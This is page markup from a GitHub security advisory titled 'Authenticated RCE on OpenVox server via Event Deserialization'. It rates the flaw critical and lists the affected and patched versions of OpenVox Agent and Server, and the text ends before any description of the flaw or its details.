href="/login?return_to=https%3A%2F%2Fgithub.com%2FOpenVoxProject%2Fopenvox%2Fsecurity%2Fadvisories%2FGHSA-ffr6-rwpm-p5wq" data-analytics-event="{&quot;action&quot;:&quot;sign_in&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;auth_cta&quot;,&quot;location&quot;:&quot;header&quot;,&quot;label&quot;:&quot;sign_in_link_auth_cta_header&quot;}" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f5b1d0dcac5288afe61ca893235b1db38ae7854868c5bda2061c986af0b3a5f9"><span class="Primer_Brand__Button-module__Button__text___ED0bX"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--mona-sans___a8XJD Primer_Brand__Text-module__Text--default___GhPh_ Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ Primer_Brand__Button-module__Button--label___qrkyz Primer_Brand__Button-module__Button--label-subtle___8ndWH">Sign in</span></span></a></div><a class="Primer_Brand__Button-module__Button___scH9Z Primer_Brand__Button-module__Button--primary___MSbnU Primer_Brand__Button-module__Button--size-small___zQrEw cta__xkenoh" href="/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&amp;source=header-repo&amp;source_repo=OpenVoxProject%2Fopenvox" data-analytics-event="{&quot;action&quot;:&quot;sign_up&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;auth_cta&quot;,&quot;location&quot;:&quot;header&quot;,&quot;label&quot;:&quot;sign_up_link_auth_cta_header&quot;}" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f5b1d0dcac5288afe61ca893235b1db38ae7854868c5bda2061c986af0b3a5f9"><span class="Primer_Brand__Button-module__Button__text___ED0bX"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--mona-sans___a8XJD Primer_Brand__Text-module__Text--default___GhPh_ Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ Primer_Brand__Button-module__Button--label___qrkyz Primer_Brand__Button-module__Button--label-primary___QX1u5">Sign up</span></span></a><button class="Primer_Brand__Button-module__Button___scH9Z Primer_Brand__Button-module__Button--subtle___F7pEE Primer_Brand__Button-module__Button--size-small___zQrEw trigger__VWDtQ2" type="button" aria-haspopup="dialog" aria-labelledby="_R_fbd_"><span class="Primer_Brand__Button-module__Button__leading-visual___jjtTe" data-testid="Button-leading-visual"><svg data-component="Octicon" focusable="false" aria-hidden="true" class="octicon octicon-sliders Primer_Brand__Button-module__Button__icon-visual____qybb" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M15 2.75a.75.75 0 0 1-.75.75h-4a.75.75 0 0 1 0-1.5h4a.75.75 0 0 1 .75.75Zm-8.5.75v1.25a.75.75 0 0 0 1.5 0v-4a.75.75 0 0 0-1.5 0V2H1.75a.75.75 0 0 0 0 1.5H6.5Zm1.25 5.25a.75.75 0 0 0 0-1.5h-6a.75.75 0 0 0 0 1.5h6ZM15 8a.75.75 0 0 1-.75.75H11.5V10a.75.75 0 1 1-1.5 0V6a.75.75 0 0 1 1.5 0v1.25h2.75A.75.75 0 0 1 15 8Zm-9 5.25v-2a.75.75 0 0 0-1.5 0v1.25H1.75a.75.75 0 0 0 0 1.5H4.5v1.25a.75.75 0 0 0 1.5 0v-2Zm9 0a.75.75 0 0 1-.75.75h-6a.75.75 0 0 1 0-1.5h6a.75.75 0 0 1 .75.75Z"></path></svg></span></button><div class="Primer_Brand__Tooltip-module__Tooltip___0Eipx" data-direction="s" aria-hidden="true" id="_R_fbd_">Appearance settings</div></div></div></div></div></div><div class="bottomBorder__38-D2c" aria-hidden="true"></div></header></div></div>
+</react-partial>
+
+
+
+
+      
+        <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
+  
+          <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+          <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
+          <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
+          <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
+
+    <button id="icon-button-7d637501-a103-421c-a8b7-986ddacf9905" aria-labelledby="tooltip-38a57f3e-839c-4b02-8449-34ce5616a2b7" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+</button><tool-tip id="tooltip-38a57f3e-839c-4b02-8449-34ce5616a2b7" for="icon-button-7d637501-a103-421c-a8b7-986ddacf9905" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>
+
+
+  
+</div>
+    </div>
+
+  <div id="start-of-content" class="show-on-focus"></div>
+
+
+
+
+
+
+
+
+    <div id="js-flash-container" class="flash-container" data-turbo-replace>
+
+
+
+
+
+  <template class="js-flash-template">
+    
+<div class="flash flash-full   {{ className }}">
+  <div >
+    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    <div aria-atomic="true" role="alert" class="js-flash-alert">
+      
+      <div>{{ message }}</div>
+
+    </div>
+  </div>
+</div>
+  </template>
+</div>
+
+
+    
+
+
+
+
+
+
+  <div
+    class="application-main "
+    
+    data-commit-hovercards-enabled
+    data-discussion-hovercards-enabled
+    data-issue-and-pr-hovercards-enabled
+    data-project-hovercards-enabled
+  >
+      <main>
+        
+    
+    
+
+
+    
+
+
+
+
+
+
+
+
+    <link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/primer-react-07e7d9aae40836f8.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/28372-48e332726df8d20f.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/34719-2b062694fc1d0889.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/13856-0d9a8c00dd4a43f0.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/81650-26cc06920088a966.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/95223-373743307d7ea920.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/82041-6585505a6ec4481a.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/39901-71d99980bccde7d7.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/66877-858c9b214a4fc7f5.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/27896-787b5aacc63c1e2d.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/82797-4878b9098ae11541.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/66860-7e4a5c82cb1a8209.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/29197-87d9e6b8f568abf9.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/66837-e2d3be3dfb3eb666.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/73486-6cd0b9cfe931b0ab.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/93425-144dcef9fd88f44d.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/33198-d5abe3b55861749e.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/63027-3eb83ed19d959c81.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/91104-8446538f46b7b472.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/95350-6b6e7f2485b56710.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/638-7e2db135a3df8acb.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/75355-1a5d2309eafc3f1c.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/94067-b0335bf9451f21ca.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/chunk-lazy-react-partial-global-nav-bar-d052c10f1a57f2de.js" fetchpriority="low" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/81758.05f0a2a04f6c2495.module.css" />
+
+<react-partial
+  partial-name="global-nav-bar"
+  data-ssr="true"
+  data-attempted-ssr="true"
+  data-react-profiling="false"
+>
+  
+  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"contextRegion":{"crumbs":[{"crumb_type":"organization","label":"OpenVoxProject","is_root":false,"href":"/OpenVoxProject"},{"crumb_type":"repository","label":"openvox","is_root":false,"href":"/OpenVoxProject/openvox"}],"localNavigation":[{"id":"code","icon":"code","label":"Code","href":"/OpenVoxProject/openvox","selectedLinks":["repo_source","repo_downloads","repo_commits","repo_releases","repo_tags","repo_branches","repo_packages","repo_deployments","repo_attestations"],"popoverTarget":false,"commandId":"repositories:go-to-code","reactNav":{"appTarget":"code-view","anchor":"code-view-repo-link"},"turboNav":{"frame":"repo-content-turbo-frame"}},{"id":"issues","icon":"issue-opened","label":"Issues","href":"/OpenVoxProject/openvox/issues","selectedLinks":["repo_issues","repo_labels","repo_milestones"],"count":84,"popoverTarget":false,"commandId":"repositories:go-to-issues","reactNav":{"appTarget":"repo","anchor":null},"turboNav":{"frame":"repo-content-turbo-frame"}},{"id":"pull-requests","icon":"git-pull-request","label":"Pull requests","href":"/OpenVoxProject/openvox/pulls","selectedLinks":["repo_pulls","checks"],"count":40,"popoverTarget":false,"commandId":"repositories:go-to-pull-requests","reactNav":{"appTarget":null,"anchor":null},"turboNav":{"frame":"repo-content-turbo-frame"}},{"id":"actions","icon":"play","label":"Actions","href":"/OpenVoxProject/openvox/actions","selectedLinks":["repo_actions"],"popoverTarget":false,"commandId":"repositories:go-to-actions","reactNav":{"appTarget":"repo","anchor":null},"turboNav":{"frame":"repo-content-turbo-frame"}},{"id":"security-and-quality","icon":"shield","label":"Security and quality","href":"/OpenVoxProject/openvox/security","selectedLinks":["security","overview","alerts","policy","token_scanning","code_scanning"],"count":1,"popoverTarget":false,"commandId":"repositories:go-to-security","reactNav":{"appTarget":null,"anchor":null},"turboNav":{"frame":"repo-content-turbo-frame"}},{"id":"insights","icon":"graph","label":"Insights","href":"/OpenVoxProject/openvox/insights","selectedLinks":["repo_graphs","repo_contributors","dependency_graph","dependabot_updates","pulse","people","community"],"popoverTarget":false,"commandId":"repositories:go-to-insights","reactNav":{"appTarget":null,"anchor":null},"turboNav":{"frame":"repo-content-turbo-frame"}}],"localNavigationUpdateChannel":null,"selectedLink":"security"},"owner":null,"headerLogo":{"href":"/","aria-label":"Homepage "},"notifications":{"indicatorMode":"disabled","websocketChannel":null,"fetchIndicatorSrc":"/notifications/indicator","fetchIndicatorEnabled":false},"issues":{"href":"/issues"},"pulls":{"href":"/pulls"},"contributedRepos":{"href":"/repos"},"copilot":{"show":false,"showAgentsButton":false,"showRelaunchAnnouncement":false,"licenseGrantNudge":null,"copilotChatUrl":null,"copilotApiUrl":"https://api.githubcopilot.com"},"search":{"show":true,"showCommandPalette":false,"isSearchPage":false,"isJumpToSearch":false,"searchContext":{"scope":"repo:OpenVoxProject/openvox","current_repo_name":"openvox","current_repo_nwo":"OpenVoxProject/openvox","current_repo_org":"OpenVoxProject","user_id":"OpenVoxProject"}},"commandPalette":null,"enterpriseBar":{"show":false},"globalTransactionalMessage":[],"ipmNudgeDelivery":null,"payloadsUrl":"/_global-navigation/payloads.json?can_toggle_site_admin_and_employee_status=0\u0026is_admin_mode_on=0\u0026is_ui_opted_out=0\u0026show_ui_opt_out=0\u0026v=9","contextRegionUrl":null}}</script>
+  <div data-target="react-partial.reactRoot"><header aria-label="Global navigation menu" data-component="Stack" class="GlobalNav appHeader__6OmbvL prc-Stack-Stack-UQ9k6" data-gap="none" data-direction="vertical" data-align="stretch" data-wrap="nowrap" data-justify="start" data-padding="none"><div data-component="Stack" class="prc-Stack-Stack-UQ9k6" data-direction="horizontal" data-align="center" data-wrap="nowrap" data-justify="center" data-padding="none"><div data-testid="top-nav-center" data-component="Stack" class="center__f1ujjY withLocalNavigation__FzpnU6 loggedOut__--dPuC prc-Stack-Stack-UQ9k6" data-gap="condensed" data-direction="horizontal" data-align="stretch" data-wrap="nowrap" data-justify="start" data-padding="normal"><nav class="contextRegion__Wb1-GR prc-Breadcrumbs-BreadcrumbsBase-3Gb-B" aria-label="Breadcrumbs" data-overflow="menu" data-variant="normal" data-component="Breadcrumbs"><ol class="prc-Breadcrumbs-BreadcrumbsList-BKjpe"><li class="prc-Breadcrumbs-ItemWrapper-k0NLn" data-index="0"><a class="contextCrumb__Q8nET8 prc-Breadcrumbs-Item-jcraJ" data-component="Breadcrumbs.Item" href="/OpenVoxProject" data-discover="true"><span class="">OpenVoxProject</span></a></li><li class="prc-Breadcrumbs-ItemWrapper-k0NLn" data-index="1"><a class="contextCrumb__Q8nET8 prc-Breadcrumbs-Item-jcraJ" data-component="Breadcrumbs.Item" href="/OpenVoxProject/openvox" data-discover="true"><span class="contextCrumbLast__l2P28s">openvox</span></a></li></ol></nav></div><div data-testid="top-nav-right" data-component="Stack" class="right__5m36ST withLocalNavigation__FzpnU6 rightWithResponsiveCreateButton__JePGAt prc-Stack-Stack-UQ9k6" data-gap="condensed" data-direction="horizontal" data-align="center" data-wrap="nowrap" data-justify="start" data-padding="normal"></div></div><h2 class="prc-src-InternalVisuallyHidden-2YaI6">Repository navigation</h2><nav class="prc-components-UnderlineWrapper-eT-Yj prc-UnderlineNav-UnderlineWrapper-GWONT LocalNavigation__QHRW7C" aria-label="Repository" data-variant="inset" data-overflow-mode="wrap" data-hide-icons-breakpoint="medium"><ul class="prc-UnderlineNav-ItemsList-oj8gN prc-components-UnderlineItemList-xKlKC" role="list"><li role="presentation" aria-hidden="true" class="prc-UnderlineNav-WrapSpacer--aLgz"></li><li class="prc-UnderlineNav-UnderlineNavItem-syRjR"><a data-tab-item="code" data-react-nav="code-view" data-react-nav-anchor="code-view-repo-link" data-turbo-frame="repo-content-turbo-frame" class="prc-components-UnderlineItem-7fP-n" href="/OpenVoxProject/openvox" data-discover="true"><span data-component="icon"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-code" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path></svg></span><span data-component="text" data-content="Code">Code</span></a></li><li class="prc-UnderlineNav-UnderlineNavItem-syRjR"><a data-tab-item="issues" data-react-nav="repo" data-turbo-frame="repo-content-turbo-frame" class="prc-components-UnderlineItem-7fP-n" href="/OpenVoxProject/openvox/issues" data-discover="true"><span data-component="icon"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-issue-opened" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path></svg></span><span data-component="text" data-content="Issues">Issues</span><span data-component="counter"><span aria-hidden="true" data-variant="secondary" data-component="CounterLabel" class="prc-CounterLabel-CounterLabel-X-kRU">84</span><span class="prc-VisuallyHidden-VisuallyHidden-Q0qSB"> (<!-- -->84<!-- -->)</span></span></a></li><li class="prc-UnderlineNav-UnderlineNavItem-syRjR"><a data-tab-item="pull-requests" data-turbo-frame="repo-content-turbo-frame" class="prc-components-UnderlineItem-7fP-n" href="/OpenVoxProject/openvox/pulls" data-discover="true"><span data-component="icon"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-pull-request" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354ZM3.75 2.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm0 9.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm8.25.75a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Z"></path></svg></span><span data-component="text" data-content="Pull requests">Pull requests</span><span data-component="counter"><span aria-hidden="true" data-variant="secondary" data-component="CounterLabel" class="prc-CounterLabel-CounterLabel-X-kRU">40</span><span class="prc-VisuallyHidden-VisuallyHidden-Q0qSB"> (<!-- -->40<!-- -->)</span></span></a></li><li class="prc-UnderlineNav-UnderlineNavItem-syRjR"><a data-tab-item="actions" data-react-nav="repo" data-turbo-frame="repo-content-turbo-frame" class="prc-components-UnderlineItem-7fP-n" href="/OpenVoxProject/openvox/actions" data-discover="true"><span data-component="icon"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-play" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path></svg></span><span data-component="text" data-content="Actions">Actions</span></a></li><li class="prc-UnderlineNav-UnderlineNavItem-syRjR"><a aria-current="page" data-tab-item="security-and-quality" data-turbo-frame="repo-content-turbo-frame" class="prc-components-UnderlineItem-7fP-n" href="/OpenVoxProject/openvox/security" data-discover="true"><span data-component="icon"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-shield" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M7.467.133a1.748 1.748 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM8.75 4.75v3a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0ZM9 10.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg></span><span data-component="text" data-content="Security and quality">Security and quality</span><span data-component="counter"><span aria-hidden="true" data-variant="secondary" data-component="CounterLabel" class="prc-CounterLabel-CounterLabel-X-kRU">1</span><span class="prc-VisuallyHidden-VisuallyHidden-Q0qSB"> (<!-- -->1<!-- -->)</span></span></a></li><li class="prc-UnderlineNav-UnderlineNavItem-syRjR"><a data-tab-item="insights" data-turbo-frame="repo-content-turbo-frame" class="prc-components-UnderlineItem-7fP-n" href="/OpenVoxProject/openvox/insights" data-discover="true"><span data-component="icon"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-graph" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.5 1.75V13.5h13.75a.75.75 0 0 1 0 1.5H.75a.75.75 0 0 1-.75-.75V1.75a.75.75 0 0 1 1.5 0Zm14.28 2.53-5.25 5.25a.75.75 0 0 1-1.06 0L7 7.06 4.28 9.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.25-3.25a.75.75 0 0 1 1.06 0L10 7.94l4.72-4.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path></svg></span><span data-component="text" data-content="Insights">Insights</span></a></li></ul><div class="prc-UnderlineNav-MoreButtonContainer-Dnrq6"><div class="prc-UnderlineNav-MoreButtonDivider-dN0a-"></div><button data-component="overflow-menu-button" type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk prc-UnderlineNav-MoreButton-Y8soj" data-loading="false" data-size="medium" data-variant="invisible" id="_R_2ktp_"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3"><span>More<span class="prc-src-InternalVisuallyHidden-2YaI6"> items</span></span></span></span><span data-component="trailingAction" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></button></div></nav><div class="d-none"></div></header></div>
+</react-partial>
+
+
+  
+
+
+
+<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
+    <div id="repo-content-pjax-container" class="repository-content " >
+    
+
+
+
+    
+      
+  <div class="clearfix new-discussion-timeline container-xl tmp-px-3 tmp-px-md-4 tmp-px-lg-5 tmp-mt-6">
+    <header class="tmp-mb-3 d-block">
+      <nav data-pjax="true" aria-label="Breadcrumb" data-view-component="true" class="d-block">
+  <ol>
+      <li data-view-component="true" class="breadcrumb-item "><a target="_self" href="/OpenVoxProject/openvox" data-view-component="true" class="Link">openvox</a></li>
+      <li data-view-component="true" class="breadcrumb-item "><a target="_self" href="/OpenVoxProject/openvox/security" data-view-component="true" class="Link">Security</a></li>
+      <li data-view-component="true" class="breadcrumb-item "><a target="_self" href="/OpenVoxProject/openvox/security/advisories" data-view-component="true" class="Link">Advisories</a></li>
+      <li data-view-component="true" class="breadcrumb-item  breadcrumb-item-selected"><a target="_self" aria-current="page" href="/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq" data-view-component="true" class="Link">GHSA-ffr6-rwpm-p5wq</a></li>
+  </ol>
+</nav>    </header>
+
+    <div class="js-socket-channel js-updatable-content"
+     data-channel="eyJjIjoicmVwb3NpdG9yeV9hZHZpc29yeTo1OTU5MDUiLCJ0IjoxNzk1MTUwMjc2fQ==--22a2b040fd07c42633a8a1effd759ac60f665d1d8bca175b2cea1bfb31518c47"
+     data-url="/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq/show_partial?partial=repository_advisory%2Ftitle"
+     >
+
+  <div class="gh-header issue js-repository-advisory-details" >
+    <div class="gh-header-show">
+
+      <h1 class="gh-header-title" >
+        Authenticated RCE on OpenVox server via Event Deserialization
+      </h1>
+
+    </div>
+
+    <div class="gh-header-meta TableObject border-0 pb-0">
+
+
+        <div class="TableObject-item">
+          <span title="Severity: critical" data-view-component="true" class="Label Label--danger Label--large text-bold mr-2 tmp-mr-2">
+  Critical
+</span>
+        </div>
+
+      <div class="TableObject-item TableObject-item--primary ws-normal">
+          <a class="author Link--secondary text-bold" data-hovercard-type="user" data-hovercard-url="/users/binford2k/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/binford2k">binford2k</a>
+          published
+          <span class="text-bold user-select-contain">GHSA-ffr6-rwpm-p5wq</span>
+          <relative-time datetime="2026-11-03T20:04:27Z" class="no-wrap">Nov 3, 2026</relative-time>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    
+
+    <div class="d-flex flex-column flex-md-row">
+      <div class="col-12 col-md-9">
+  
+    <div class="Details js-details-container width-full">
+  <div class="Details-content--shown">
+      <div class="Box Box--responsive ">
+  <div class="Box-body">
+        <div class="Bow-row border-0 clearfix " >
+  <div class="float-left col-12 col-md-6 pr-md-2">
+      <h2 class="text-small color-fg-muted mb-1">Package</h2>
+
+    <div >
+      <span class="f4 color-fg-default text-bold">OpenVox Agent</span>        <span class="color-fg-muted f4 d-inline-flex text-underline" >
+            (OpenVox/Puppet)
+        </span>
+    </div>
+  </div>
+
+  <div class="float-left col-6 col-md-3 py-2 py-md-0 pr-2">
+      <h2 class="text-small color-fg-muted mb-1">Affected versions</h2>
+
+      <div class="f4 color-fg-default" >&lt;= 9.2.0 and &lt;= 8.31.1</div>
+  </div>
+
+  <div class="float-left col-6 col-md-3 py-2 py-md-0">
+      <h2 class="text-small color-fg-muted mb-1">Patched versions</h2>
+
+      <div class="f4 color-fg-default" >9.3.0 and 8.32.0</div>
+  </div>
+</div>
+
+        <div class="Bow-row border-0 clearfix pt-2" >
+  <div class="float-left col-12 col-md-6 pr-md-2">
+
+    <div >
+      <span class="f4 color-fg-default text-bold">OpenVox Server</span>        <span class="color-fg-muted f4 d-inline-flex text-underline" >
+            (OpenVox/Puppet)
+        </span>
+    </div>
+  </div>
+
+  <div class="float-left col-6 col-md-3 py-2 py-md-0 pr-2">
+
+      <div class="f4 color-fg-default" >&lt;= 9.1.0 and &lt;= 8.17.0</div>
+  </div>
+
+  <div class="float-left col-6 col-md-3 py-2 py-md-0">
+
+      <div class="f4 color-fg-default" >9.2.0 and 8.18.0</div>
+  </div>
+</div>
+
+  </div>
+</div>
+
+
+    <div class="Box Box--responsive tmp-mt-3">
+  <div class="Box-header color-bg-default border-bottom-0 ">
